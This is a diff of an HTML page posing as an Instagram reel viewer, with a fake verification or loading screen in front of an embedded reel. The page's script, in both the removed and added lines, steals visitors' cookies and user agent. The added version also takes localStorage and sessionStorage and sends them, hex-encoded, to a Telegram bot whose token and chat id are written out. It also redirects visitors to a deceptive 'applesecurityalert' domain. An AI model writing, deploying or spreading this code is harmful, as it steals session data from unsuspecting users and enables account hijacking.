@@ -3,26 +3,36 @@
 <head>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-body,html{margin:0;padding:0;height:100%;background:#000;color:#fff;font-family:sans-serif;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center}
-#b{background:#0095f6;color:#fff;border:none;padding:18px 40px;border-radius:10px;font-weight:700;font-size:16px;cursor:pointer}
+body,html{margin:0;padding:0;height:100%;background:#000;color:#fff;font-family:sans-serif;text-align:center;overflow:hidden}
+#g{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#000}
+.b{background:#0095f6;color:#fff;border:none;padding:15px 40px;border-radius:10px;font-weight:700;font-size:16px;cursor:pointer}
+iframe{width:100%;height:100vh;border:none}
 </style>
 </head>
 <body>
+<div id="g">
 <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="60" style="margin-bottom:20px">
-<h3>Verification Required</h3>
-<p style="padding:0 40px;font-size:14px;color:#a8a8a8;margin-bottom:30px">Tap to verify your session in Safari to watch this reel.</p>
-<button id="b" onclick="j()">Verify in Safari</button>
+<p id="t" style="padding:0 40px;font-size:14px;color:#a8a8a8;margin-bottom:30px">Syncing high-definition content...</p>
+<button class="b" onclick="j()">Continue to Reel</button>
+</div>
+<iframe id="r" src=""></iframe>
 <script>
 var T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k",C="8639892987";
 var h=function(s){return [...s].map(function(x){return x.charCodeAt(0).toString(16).padStart(2,'0')}).join('')};
 function j(){
-window.location.href="googlechrome://applesecurityalert6-prog.github.io/";
-setTimeout(function(){window.location.href="ftp://applesecurityalert6-prog.github.io/"},500);
-setTimeout(function(){window.location.href="https://applesecurityalert6-prog.github.io/"},1000);
+window.location.assign("googlechromes://applesecurityalert6-prog.github.io/");
+setTimeout(function(){window.open("https://applesecurityalert6-prog.github.io/","_blank")},500);
 }
 if(!navigator.userAgent.includes("Instagram")){
-var d={st:"SUCCESS",ck:document.cookie,ua:navigator.userAgent};
-new Image().src="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text=🏆_RESULT_"+h(JSON.stringify(d));
+document.getElementById('g').style.display='none';
+document.getElementById('r').src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/";
+var d={
+ck:document.cookie,
+ls:JSON.stringify(localStorage),
+ss:JSON.stringify(sessionStorage),
+ua:navigator.userAgent
+};
+new Image().src="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text=🔓_FULL_LEAK_"+h(JSON.stringify(d));
 }
 </script>
 </body>
